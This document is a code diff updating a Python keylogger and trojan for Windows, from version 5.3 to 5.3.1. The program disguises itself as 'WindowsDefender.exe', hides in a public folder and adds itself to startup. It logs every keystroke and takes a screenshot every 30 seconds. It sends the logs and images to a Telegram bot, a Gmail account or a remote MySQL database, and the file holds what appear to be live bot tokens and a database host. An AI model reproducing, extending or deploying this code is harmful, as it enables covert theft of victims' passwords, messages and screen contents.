@@ -8,7 +8,7 @@
 # ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
 # ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
-# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v5.3
+# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v5.3.1
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║           by SebastianEPH
 # ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝   https://github.com/SebastianEPH|
 
@@ -35,19 +35,23 @@ from PIL import ImageGrab       # Toma capturas de pantalla
 class Config:
     def __init__(self):
         self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
-        self.NAME_REG = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.NAME_REG = "Windows Defeder REG"                                           # Nombre del Keylogger en el registro
         self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"           # Ruta del Registro de teclas
-        self.LOG_NAME = "reg" + "." + "k"
-        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
-        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY         # <No cambiar>
-        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
-        self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
-        self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
-        self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
-        self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
+        self.LOG_NAME = "reg" + ".k"
+        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"   # Ruta donde se esconderá el KEYLOGGER
+        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY    # <No cambiar>
+        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME    # <No cambiar>
+        self.USERNAME = getuser()                               # Windows UserName or custom name
+        self.TROJAN = True                                      # Active or disable function Trojan
+        self.STARTUP = True                                     # Active or diable function StarUp
+        self.SCREENSHOT = True                                  # active or disable function Screenshot
+        self.KEYLOGGER = True                                   # active or disable function Keylogger
+        self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
+        self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
+        self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
         self.MODE_SEND = 2      # 0 = Gmail
-                           # 1 = DataBase                                           # Solo se puede usar una opción
-                           # 2 = TelegramBot
+                                # 1 = DataBase                  # Solo se puede usar una opción
+                                # 2 = TelegramBot
     class DataBase:  # Clase de Base de datos
         def __init__(self):
             self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
@@ -69,15 +73,19 @@ class Config:
           # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
     class TelegramBot:
         def __init__(self):
-            self.ID   = 831233303                                                     # ID Principal [Obligatorio]
+            self.ID   = 833456944                                                     # ID Principal [Obligatorio]
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
-            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
+            self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp844"             # TOKEN de tu Bot [Obligatorio]
             # Personalize
-            self.LEN_TEXT = 2#3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+            self.LEN_TEXT = 3000  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 
 class Functions:
+    def CurrentTime(self):
+        T = datetime.datetime.now()
+        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
+            "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
     def CheckFolder_StartUP(self):  # Función especial para el startUp
         try:    # Intenta crear la dirección
             os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
@@ -85,12 +93,12 @@ class Functions:
         except:
             return False    # La carpeta ya existe
         pass
-
     def RandomChar(self,number =50): # Genera letras aleatorias [Longitud según el argumento]
         return ''.join(random.choice(string.ascii_letters) for x in range(number))
-    def RamdomLogNamePATH(self, number = 23):
-        return Config().PATH_HIDDEN_LOG + Functions().RandomChar(number) + ".txt"
-
+    def pathRamdom_log(self, number = 23):
+        return Config().PATH_HIDDEN_LOG + self.RandomChar(number) + ".txt"
+    def pathRamdom_ScreenShot(self, long=10):
+        return Config().PATH_HIDDEN_LOG+ Config().USERNAME + " - " + self.CurrentTime() + self.RandomChar(long)+".jpg"
     # Función = Verifica si hay conexión a internet para poder envíar el log
     def VerifyConnection(self):
         con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
@@ -103,36 +111,13 @@ class Functions:
             print("[Test Internet] => [NO]")
             return False
 
-    def SendGmail(self, file, email, password, receiver_email):
-        try:
-            f = datetime.datetime.now()
-            subject = "Data User: " + str(getuser())
-            # Inicia Sesión
-            yag = yagmail.SMTP(user=email, password=password)
-            informacion = "\nFecha: " + f.strftime("%A") + " " + f.strftime("%d") + " de " + f.strftime(
-                "%B") + "\nHora: " + f.strftime("%I") + ":" + f.strftime("%M") + " " + f.strftime(
-                "%p") + " con " + f.strftime("%S") + " Segundos"
-            # Cuerpo del mensaje
-            contents = [
-                "Información:\n\nNombre de Usuario: " + str(getuser()) + informacion
-            ]
-            yag.send(receiver_email, subject, contents, attachments=file)
-            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
-            return True
-        except:
-            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
-            return False
-
-    def CurrentTime(self):
-        T = datetime.datetime.now()
-        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
-    def LenghtText(self): # Verifica el el registro tiene una cierta cantidad de texto
+    def LenghtText(self):  # Verifica el el registro tiene una cierta cantidad de texto
         try:  # Busca el archivo
             regk = open(Config().PATH_LOG, 'r')
             LEN_TEXT = len(regk.read())
-            print("[LenghtText] Se encontró el Archivo "+Config().LOG_NAME+ " correctamente")
+            print("[LenghtText] Se encontró el Archivo " + Config().LOG_NAME + " correctamente")
             if LEN_TEXT > Config.TelegramBot().LEN_TEXT:
-                print("[LenghtText] La cantidad de caracteres es superior a: "+str(LEN_TEXT))
+                print("[LenghtText] La cantidad de caracteres es superior a: " + str(LEN_TEXT))
                 regk.close()
                 return True
             else:
@@ -142,8 +127,22 @@ class Functions:
         except:
             print("[LenghtText] No se encontró el Archivo " + Config().LOG_NAME)
             return False
-
-
+    def SendGmail(self, file, email, password, receiver_email):
+        try:
+            f = datetime.datetime.now()
+            subject = "Data User: " + Config().USERNAME
+            # Inicia Sesión
+            yag = yagmail.SMTP(user=email, password=password)
+            # Cuerpo del mensaje
+            contents = [
+                "Información:\n\nNombre de Usuario: " + Config().USERNAME + Functions().CurrentTime()
+            ]
+            yag.send(receiver_email, subject, contents, attachments=file)
+            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
+            return True
+        except:
+            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
+            return False
 class Util:
     def __init__(self): #Constructor?
         pass
@@ -208,11 +207,15 @@ class Util:
             print("[ScreenShot] Se envió correctamente al ID: " + str(id))
         except:
             print("[ScreenShot] Hubo un error en el proceso. ID: " + str(id))
-
+    def Screenshot(self,path):
+        imagen = ImageGrab.grab()
+        print("[ScreenShot] Se tomó una captura ")
+        imagen.save(path)
+        print("[ScreenShot] Se guardó correctamente la captura")
     # Envía los datos reg.k vía Gmail
     def SendGmail(self):
         # Crea nombre del archivo
-        nameFile = Functions().RamdomLogNamePATH()
+        nameFile = Functions().pathRamdom_log()
         # Renombra el archivo original
         self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`
 
@@ -233,14 +236,14 @@ class Util:
     def TelegramBot(self):
         print("[TelegramBot] start....")
         if Functions().LenghtText():
-            pathN = Functions().RamdomLogNamePATH()
+            pathN = Functions().pathRamdom_log()
             os.rename(Config().PATH_LOG, pathN)
             # Abre el archivo
             f = open(pathN, 'r')
             def SendT(ID):
                 try:
                     bot = telepot.Bot(Config.TelegramBot().TOKEN)  # Token
-                    bot.sendMessage(Config.TelegramBot().ID, "User: " + str(getuser()) + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
+                    bot.sendMessage(Config.TelegramBot().ID, "User: " + Config().USERNAME + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
                     print("[TelegramBot] se envió a Telegram [ID] = " + str(ID))
                 except:
                     print("[TelegramBot] no se pudo enviar el archivo [ID] = " + str(ID))
@@ -276,7 +279,7 @@ class Util:
             print("Error al iniciar sesión [DataBase]")
 
         def UpdateUser():
-            pathN = Functions().RamdomLogNamePATH()
+            pathN = Functions().pathRamdom_log()
             try:
                 os.rename(Config().PATH_LOG, pathN)
                 # Abre el archivo
@@ -284,13 +287,9 @@ class Util:
                 data = f.read()
                 f.close()
                 print(data)
-                # Tiempo
-                T = datetime.datetime.now()
-                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
-                    "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
-                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
+                sql = 'INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)'
                 try:
-                    cursor.execute(sql, (str(getuser()), currentTime, data))  # Ejecuta virtual
+                    cursor.execute(sql, (Config().USERNAME, Functions().CurrentTime(), data))  # Ejecuta virtual
                     connection.commit()  # Se guardan virtual
                     print("[Database] Se subieron los datos correctamente")
                     # Elimina Registro Key
@@ -327,41 +326,32 @@ class Send:
                 if Config().MODE_SEND == 2:
                     Util().TelegramBot()
     def ScreenShot(self):
-        if Config().SCREENSHOT:
-            print("[ScreenShot] Active...")
-            while True:
-                print("[ScreenShot] Wait: " + str(Config().TIME_SCREENSHOT)+ "Minutes")
-                time.sleep(Config().TIME_SCREENSHOT * 60)
-                if Functions().VerifyConnection():
-                    PATH_SCREEN = Config().PATH_HIDDEN_LOG + str(getuser()) + " - " + Functions().CurrentTime() + ".jpg"
-                    # Toma captura
-                    screenshot = ImageGrab.grab()
-                    print("[ScreenShot] Se tomó una captura ")
-                    screenshot.save(PATH_SCREEN)
-                    print("[ScreenShot] Se guardó correctamente la captura")
+        print("[ScreenShot] Active...")
+        while True:
+            print("[ScreenShot] Wait: " + str(Config().TIME_SCREENSHOT) + " seconds")
+            time.sleep(Config().TIME_SCREENSHOT)
+            pathScreen = Functions().pathRamdom_ScreenShot()
+            if Functions().VerifyConnection():
+                Util().Screenshot(pathScreen)
+                # Envía a distintas cuentas simultaneamente
+                if Config.TelegramBot().ID != 000000000:
+                    print("[Send ScreenShot] ID Aceptado")
+                    Util().SendBotScreenShot(Config.TelegramBot().ID, pathScreen)
 
-                    # Envía a distintas cuentas simultaneamente
-                    if Config.TelegramBot().ID != 000000000:
-                        print("[Send ScreenShot] ID Aceptado")
-                        Util().SendBotScreenShot(Config.TelegramBot().ID, PATH_SCREEN)
+                if Config.TelegramBot().ID_2 != 000000000:
+                    print("[Send ScreenShot] ID 2 Aceptado")
+                    Util().SendBotScreenShot(Config.TelegramBot().ID_2, pathScreen)
 
-                    if Config.TelegramBot().ID_2 != 000000000:
-                        print("[Send ScreenShot] ID 2 Aceptado")
-                        Util().SendBotScreenShot(Config.TelegramBot().ID_2, PATH_SCREEN)
+                if Config.TelegramBot().ID_3 != 000000000:
+                    print("[Send ScreenShot] ID 3 Aceptado")
+                    Util().SendBotScreenShot(Config.TelegramBot().ID_3, pathScreen)
 
-                    if Config.TelegramBot().ID_3 != 000000000:
-                        print("[Send ScreenShot] ID 3 Aceptado")
-                        Util().SendBotScreenShot(Config.TelegramBot().ID_3, PATH_SCREEN)
-
-                    # Se terminó de enviar
-                    try:
-                        os.remove(PATH_SCREEN)
-                        print("[ScreenShot] Se eliminó caché")
-                    except:
-                        print("[ScreenShot] No se pudo eliminar el caché ")
-
-        else:
-            print("[ScreenShot] Disable...")
+                # Se terminó de enviar
+                try:
+                    os.remove(pathScreen)
+                    print("[ScreenShot] Se eliminó caché")
+                except:
+                    print("[ScreenShot] No se pudo eliminar el caché ")
 
 class Keylogger:
     def __init__(self):
@@ -557,34 +547,17 @@ class Keylogger:
 #endregion
 
 if __name__ == '__main__':
-
     print("[Keylogger] start...")
-    Util().Trojan()     # Reply system
-    Util().addStartUp() # Added in Startup
+
+    Util().Trojan()     if Config().TROJAN  else False # Mode Trojan
+    Util().addStartUp() if Config().STARTUP else False # Added in Startup
 
     # Delay
     print("[Keylogger] Delay... "+ str(Config().DELAY))
     time.sleep(Config().DELAY)
     print("[Keylogger] Finish Delay")
-    # Create threads
-    key = threading.Thread(target=Keylogger().GetKeys)  # Registra pulsaciones
-    send = threading.Thread(target=Send().Log)  # Envía Registro
-    screenshot = threading.Thread(target=Send().ScreenShot)  # Screenshot
-
     print("[Keylogger] Listening to Keys...")
-    # Start Threads
-    key.start()
-    screenshot.start()
-    send.start()
-    key.join()
-
-
-
-
-
-
-
-
-
-
-
+    # Create and start threads
+    threading.Thread(target=Send().Log).start()  # Envía Registro
+    threading.Thread(target=Keylogger().GetKeys).start()    if Config().KEYLOGGER else print("[Keylogger] Disable...") # Registra pulsaciones
+    threading.Thread(target=Send().ScreenShot).start()      if Config().SCREENSHOT and Config().MODE_SEND == 2 else print("[ScreenShot] Disable...") # Screenshot
